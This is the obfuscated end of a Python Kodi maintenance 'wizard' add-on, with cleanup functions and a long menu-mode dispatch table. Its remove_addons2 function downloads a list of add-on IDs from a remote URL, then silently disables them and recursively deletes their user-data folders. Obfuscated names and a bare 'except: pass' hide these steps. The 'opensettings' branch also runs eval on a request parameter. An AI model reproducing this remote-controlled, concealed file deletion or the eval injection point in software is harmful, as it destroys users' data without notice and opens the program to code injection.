				O00OOO0O000OOOO0O =os .path .join (addons_folder ,O00OO00O00O0000O0 )#line:5058
				if os .path .exists (O00OOO0O000OOOO0O ):#line:5060
					for O000OOOO00O0OOOOO ,O0O00OO00OOOO0O0O ,O00O00O0OO0O0O0O0 in os .walk (O00OOO0O000OOOO0O ):#line:5061
						for O0000OOOO0O000000 in O00O00O0OO0O0O0O0 :#line:5062
							os .unlink (os .path .join (O000OOOO00O0OOOOO ,O0000OOOO0O000000 ))#line:5063
						for O0O00O0OOO00OO0OO in O0O00OO00OOOO0O0O :#line:5064
							shutil .rmtree (os .path .join (O000OOOO00O0OOOOO ,O0O00O0OOO00OO0OO ))#line:5065
					os .rmdir (O00OOO0O000OOOO0O )#line:5066
			xbmc .executebuiltin ('Container.Refresh')#line:5068
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5069
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5070
	except :pass #line:5071
def remove_addons2 ():#line:5072
	try :#line:5073
			import json #line:5074
			OO00OOO0O0O000O0O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5075
			for OO000OO0OOO0OOO0O in OO00OOO0O0O000O0O :#line:5076
				O0000OO0OOO0O00OO =OO000OO0OOO0OOO0O .split (':')[1 ].strip ()#line:5078
				OOOO00O00OO000OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0000OO0OOO0O00OO ,'false')#line:5079
				OO0000O000O0OO00O =xbmc .executeJSONRPC (OOOO00O00OO000OOO )#line:5080
				O0O000OO000OOO0OO =json .loads (OO0000O000O0OO00O )#line:5081
				O00OO0O0OO0O00000 =os .path .join (user_folder ,O0000OO0OOO0O00OO )#line:5083
				if os .path .exists (O00OO0O0OO0O00000 ):#line:5085
					for OOO00OOO0O0O00O0O ,OO0OO0O00OO0O00OO ,O0O0O0OO00OOOO00O in os .walk (O00OO0O0OO0O00000 ):#line:5086
						for OOO00OO0O00OO00O0 in O0O0O0OO00OOOO00O :#line:5087
							os .unlink (os .path .join (OOO00OOO0O0O00O0O ,OOO00OO0O00OO00O0 ))#line:5088
						for OOOOOO000000O0O00 in OO0OO0O00OO0O00OO :#line:5089
							shutil .rmtree (os .path .join (OOO00OOO0O0O00O0O ,OOOOOO000000O0O00 ))#line:5090
					os .rmdir (O00OO0O0OO0O00000 )#line:5091
	except :pass #line:5093
params =get_params ()#line:5094
url =None #line:5095
name =None #line:5096
mode =None #line:5097
try :mode =urllib .unquote_plus (params ["mode"])#line:5099
except :pass #line:5100
try :name =urllib .unquote_plus (params ["name"])#line:5101
except :pass #line:5102
try :url =urllib .unquote_plus (params ["url"])#line:5103
except :pass #line:5104
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5106
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5107
def setView (O0000O0O0OOO0O00O ,OOO0OOOO0O00O0OOO ):#line:5108
	if wiz .getS ('auto-view')=='true':#line:5109
		O0OO000OOOO000O00 =wiz .getS (OOO0OOOO0O00O0OOO )#line:5110
		if O0OO000OOOO000O00 =='50'and KODIV >=17 and SKIN =='skin.estuary':O0OO000OOOO000O00 ='55'#line:5111
		if O0OO000OOOO000O00 =='500'and KODIV >=17 and SKIN =='skin.estuary':O0OO000OOOO000O00 ='50'#line:5112
		wiz .ebi ("Container.SetViewMode(%s)"%O0OO000OOOO000O00 )#line:5113
if mode ==None :index ()#line:5115
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5117
elif mode =='builds':buildMenu ()#line:5118
elif mode =='viewbuild':viewBuild (name )#line:5119
elif mode =='buildinfo':buildInfo (name )#line:5120
elif mode =='buildpreview':buildVideo (name )#line:5121
elif mode =='install':buildWizard (name ,url )#line:5122
elif mode =='theme':buildWizard (name ,mode ,url )#line:5123
elif mode =='viewthirdparty':viewThirdList (name )#line:5124
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5125
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5126
elif mode =='maint':maintMenu (name )#line:5128
elif mode =='passpin':passandpin ()#line:5129
elif mode =='backmyupbuild':backmyupbuild ()#line:5130
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5131
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5132
elif mode =='advancedsetting':advancedWindow (name )#line:5133
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5134
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5135
elif mode =='asciicheck':wiz .asciiCheck ()#line:5136
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5137
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5138
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5139
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5140
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5141
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5142
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5143
elif mode =='currentsettings':viewAdvanced ()#line:5144
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5145
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5146
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5147
elif mode =='fixskin':backtokodi ()#line:5148
elif mode =='testcommand':testcommand ()#line:5149
elif mode =='rdon':rdon ()#line:5150
elif mode =='rdoff':rdoff ()#line:5151
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5152
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5153
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5154
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5155
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5156
elif mode =='freshstart':freshStart ()#line:5157
elif mode =='forceupdate':wiz .forceUpdate ()#line:5158
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5159
elif mode =='forceclose':wiz .killxbmc ()#line:5160
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5161
elif mode =='hidepassword':wiz .hidePassword ()#line:5162
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5163
elif mode =='enableaddons':enableAddons ()#line:5164
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5165
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5166
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5167
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5168
elif mode =='uploadlog':uploadLog .Main ()#line:5169
elif mode =='viewlog':LogViewer ()#line:5170
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5171
elif mode =='viewerrorlog':errorChecking (all =True )#line:5172
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5173
elif mode =='purgedb':purgeDb ()#line:5174
elif mode =='fixaddonupdate':fixUpdate ()#line:5175
elif mode =='removeaddons':removeAddonMenu ()#line:5176
elif mode =='removeaddon':removeAddon (name )#line:5177
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5178
elif mode =='removedata':removeAddonData (name )#line:5179
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5180
elif mode =='systeminfo':systemInfo ()#line:5181
elif mode =='restorezip':restoreit ('build')#line:5182
elif mode =='restoregui':restoreit ('gui')#line:5183
elif mode =='restoreaddon':restoreit ('addondata')#line:5184
elif mode =='restoreextzip':restoreextit ('build')#line:5185
elif mode =='restoreextgui':restoreextit ('gui')#line:5186
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5187
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5188
elif mode =='apk':apkMenu (name )#line:5190
elif mode =='apkscrape':apkScraper (name )#line:5191
elif mode =='apkinstall':apkInstaller (name ,url )#line:5192
elif mode =='speed':speedMenu ()#line:5193
elif mode =='net':net_tools ()#line:5194
elif mode =='GetList':GetList (url )#line:5195
elif mode =='youtube':youtubeMenu (name )#line:5196
elif mode =='viewVideo':playVideo (url )#line:5197
elif mode =='addons':addonMenu (name )#line:5199
elif mode =='addoninstall':addonInstaller (name ,url )#line:5200
elif mode =='savedata':saveMenu ()#line:5202
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5203
elif mode =='managedata':manageSaveData (name )#line:5204
elif mode =='whitelist':wiz .whiteList (name )#line:5205
elif mode =='trakt':traktMenu ()#line:5207
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5208
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5209
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5210
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5211
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5212
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5213
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5214
elif mode =='realdebrid':realMenu ()#line:5216
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5217
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5218
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5219
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5220
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5221
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5222
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5223
elif mode =='login':loginMenu ()#line:5225
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5226
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5227
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5228
elif mode =='clearlogin':loginit .clearSaved (name )#line:5229
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5230
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5231
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5232
elif mode =='contact':notify .contact (CONTACT )#line:5234
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5235
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5236
elif mode =='developer':developer ()#line:5238
elif mode =='converttext':wiz .convertText ()#line:5239
elif mode =='createqr':wiz .createQR ()#line:5240
elif mode =='testnotify':testnotify ()#line:5241
elif mode =='testnotify2':testnotify2 ()#line:5242
elif mode =='servicemanual':servicemanual ()#line:5243
elif mode =='fastinstall':fastinstall ()#line:5244
elif mode =='testupdate':testupdate ()#line:5245
elif mode =='testfirst':testfirst ()#line:5246
elif mode =='testfirstrun':testfirstRun ()#line:5247
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5248
elif mode =='bg':wiz .bg_install (name ,url )#line:5250
elif mode =='bgcustom':wiz .bg_custom ()#line:5251
elif mode =='bgremove':wiz .bg_remove ()#line:5252
elif mode =='bgdefault':wiz .bg_default ()#line:5253
elif mode =='rdset':rdsetup ()#line:5254
elif mode =='mor':morsetup ()#line:5255
elif mode =='mor2':morsetup2 ()#line:5256
elif mode =='resolveurl':resolveurlsetup ()#line:5257
elif mode =='urlresolver':urlresolversetup ()#line:5258
elif mode =='forcefastupdate':forcefastupdate ()#line:5259
elif mode =='traktset':traktsetup ()#line:5260
elif mode =='placentaset':placentasetup ()#line:5261
elif mode =='flixnetset':flixnetsetup ()#line:5262
elif mode =='reptiliaset':reptiliasetup ()#line:5263
elif mode =='yodasset':yodasetup ()#line:5264
elif mode =='numbersset':numberssetup ()#line:5265
elif mode =='uranusset':uranussetup ()#line:5266
elif mode =='genesisset':genesissetup ()#line:5267
elif mode =='fastupdate':fastupdate ()#line:5268
elif mode =='folderback':folderback ()#line:5269
elif mode =='menudata':Menu ()#line:5270
elif mode ==2 :#line:5272
        wiz .torent_menu ()#line:5273
elif mode ==3 :#line:5274
        wiz .popcorn_menu ()#line:5275
elif mode ==8 :#line:5276
        wiz .metaliq_fix ()#line:5277
elif mode ==9 :#line:5278
        wiz .quasar_menu ()#line:5279
elif mode ==5 :#line:5280
        swapSkins ('skin.Premium.mod')#line:5281
elif mode ==13 :#line:5282
        wiz .elementum_menu ()#line:5283
elif mode ==16 :#line:5284
        wiz .fix_wizard ()#line:5285
elif mode ==17 :#line:5286
        wiz .last_play ()#line:5287
elif mode ==18 :#line:5288
        wiz .normal_metalliq ()#line:5289
elif mode ==19 :#line:5290
        wiz .fast_metalliq ()#line:5291
elif mode ==20 :#line:5292
        wiz .fix_buffer2 ()#line:5293
elif mode ==21 :#line:5294
        wiz .fix_buffer3 ()#line:5295
elif mode ==11 :#line:5296
        wiz .fix_buffer ()#line:5297
elif mode ==15 :#line:5298
        wiz .fix_font ()#line:5299
elif mode ==14 :#line:5300
        wiz .clean_pass ()#line:5301
elif mode ==22 :#line:5302
        wiz .movie_update ()#line:5303
elif mode =='adv_settings':buffer1 ()#line:5304
elif mode =='getpass':getpass ()#line:5305
elif mode =='setpass':setpass ()#line:5306
elif mode =='setuname':setuname ()#line:5307
elif mode =='passandUsername':passandUsername ()#line:5308
elif mode =='9':disply_hwr ()#line:5309
elif mode =='99':disply_hwr2 ()#line:5310
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))